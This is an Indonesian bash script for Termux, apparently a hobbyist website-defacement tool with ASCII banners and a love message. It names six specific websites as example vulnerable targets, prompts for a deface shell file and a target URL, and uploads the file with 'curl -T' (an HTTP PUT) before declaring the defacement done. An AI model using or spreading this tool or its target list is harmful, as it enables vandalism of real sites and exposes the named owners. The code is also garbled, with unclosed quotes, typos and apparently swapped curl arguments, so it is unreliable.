#usr/bin/bash

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple 
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

echo $me" ║██  ❤️❤️  ❤️❤️  ██   ██    
echo $me" ║██  ❤️  ❤️  ❤️  ██   ██
echo $me" ║██    ❤️  ❤️    ██   ██
echo $me" ║██      ❤️      ███████
echo $me" 
slep"
echo $pu"  ████  ███    █   █   █   █ 
echo $pu"  ██  ██  ██  █ █   █ █   █ █
echo $pu"  ██      ██  █❤️█   █║   █❤️█
echo $pu"  ██      ██  █  █   █║   █  █
echo $pu"
echo ""
echo ""
echo ""
echo "Script Ini diperbarui Stah ^_^" | lolcat
sleep 1
echo $ku"Pastikan Punya script buat Deface ( shell ) stah ^_^"
echo $i"——————————————————————————————————————————————————————————"
echo $pur"              [•]DARI : IPAN ADITIA
echo $ku"             [•]KEPADA : MAYA LESTARI
echo $i"             [•] PESAN  : AKU SAYANG KAMU
echo $me"      [•]ISI KANDUNGAN : AWOKAWOKAOWK ❤️
echo $i"——————————————————————————————————————————————————————————"
sleep 2
echo ""
echo ""
echo ""
echo $i"              CONTOH WEB VULN STAH ^_^"
echo $pur"         [1]http://scnc.co.za "
echo $pur"         [2]http://handj.co.za"
echo $pur"         [3]http://lwrm.co.za"
echo $pur"         [4]http://mc3qs.com"
echo $pur"         [5]http://mpark.co.za"
echo $pur"         [6]http://8x8.co.za"
echo ""
echo ""
echo " Udah asw jangan banyak - banyak ^_^" | lolcat
echo $pur"Aing Noob stah ^_^"
read -p "Masukkan Script defacenya ( shell )  :" script;
read -p "Masukkan web yg mau di deface        :" web;
echo "SEDANG MENDEFACE STAH ^_^" | lolcat
echo $i"L"$ku"O"$me"A"$pur"D"$cy"I"$ku"N"$i"G"
termux-setup-storage
curl -T /sdcard/$web $script
echo "Berhasil Di Deface ea :v" | lolcat
echo $i"Buka Hasilnya Disini Stah : $web/ $script"

